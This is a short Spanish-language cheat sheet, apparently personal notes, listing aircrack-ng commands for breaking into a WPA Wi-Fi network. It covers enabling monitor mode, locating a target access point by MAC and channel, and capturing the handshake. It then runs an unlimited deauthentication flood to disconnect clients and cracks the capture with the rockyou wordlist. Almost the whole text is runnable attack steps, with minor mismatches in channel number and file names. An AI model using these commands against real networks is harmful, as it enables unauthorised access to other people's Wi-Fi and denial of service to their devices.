************
Comandos
************

Checkear Intefaces

iwconfig

Matamos procesos relacionados a airmong-ng
sudo airmon-ng check kill

Comezar monitor mode
sudo airmon-ng start wlan0

Verificar que el modo monitor este funcionando
sudo airmon-ng
iwconfig

Obtener la MAC Address y canal del SSID WIFI (Red Wifi)
sudo airodump-ng wlan0mon

AP-MAC & Canal
ESSID: B0:4E:26:53:B8:C9
Channel used by AP for SSID: 10

sudo airodump-ng wlan0mon -d B0:4E:26:53:B8:C9


Primera Ventana de comando
En la sintaxis del comando siguiente colocammos la MAC, el Canal,
el nombre de archivo de nuestro handshake y que interfaz realizara el
trabajo
sudo airodump-ng -w testeo80 -c 2 --bssid B0:4E:26:53:B8:C9 wlan0mon

Segunda Ventana - Ataque de Deautenthicacion  - El cero hace referecia que sera infinita la cantidad de desauthenthication
sudo aireplay-ng --deauth 0 -a B0:4E:26:53:B8:C9 wlan0mon


Usar wireshark para ver el handshake
wireshark testeo78.cap
Filtar mensajes en Wireshark "EAPOL"
eapol

Parar monitor mode
airmon-ng stop wlan0mon

Crackear el archivo con las wordlists que vienen en kali
o elegir una propia
aircrack-ng testeo80-01.cap -w /home/rogerio24/Desktop/rockyou.txt
